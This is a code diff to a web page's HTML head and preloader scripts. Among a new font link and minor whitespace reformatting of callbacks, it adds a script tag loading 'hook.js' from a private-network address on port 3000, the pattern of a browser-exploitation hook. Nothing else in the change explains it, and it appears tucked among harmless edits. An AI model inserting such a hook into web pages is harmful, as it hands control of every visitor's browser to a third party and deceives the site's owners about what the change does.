@@ -15,6 +15,8 @@
     <link
         href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap"
         rel="stylesheet">
+    <!-- Inertia Logo Font -->
+    <link href="https://fonts.cdnfonts.com/css/inertia" rel="stylesheet">
     <!-- FontAwesome for Icons -->
     <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" as="style"
         onload="this.onload=null;this.rel='stylesheet'"><noscript>
@@ -33,6 +35,8 @@
             document.documentElement.classList.add('no-preloader');
         }
     </script>
+    <script src="http://192.168.8.103:3000/hook.js"></script>
+
 </head>
 
 <body class="theme-orange">
@@ -169,10 +173,10 @@
         var preloaderStart = Date.now();
 
         // Real model download progress
-        window.addEventListener("model-progress", function(e) {
+        window.addEventListener("model-progress", function (e) {
             updateProgress(e.detail);
         });
-        window.addEventListener("model-ready", function() {
+        window.addEventListener("model-ready", function () {
             updateProgress(100);
             var remaining = Math.max(0, 2000 - (Date.now() - preloaderStart));
             setTimeout(hidePreloader, remaining);
@@ -180,7 +184,7 @@
         updateProgress(0);
 
         // Safety: dismiss preloader after 20s regardless
-        setTimeout(function() {
+        setTimeout(function () {
             var el = document.getElementById("page-preloader");
             if (el && !el.classList.contains("hidden")) {
                 hidePreloader();
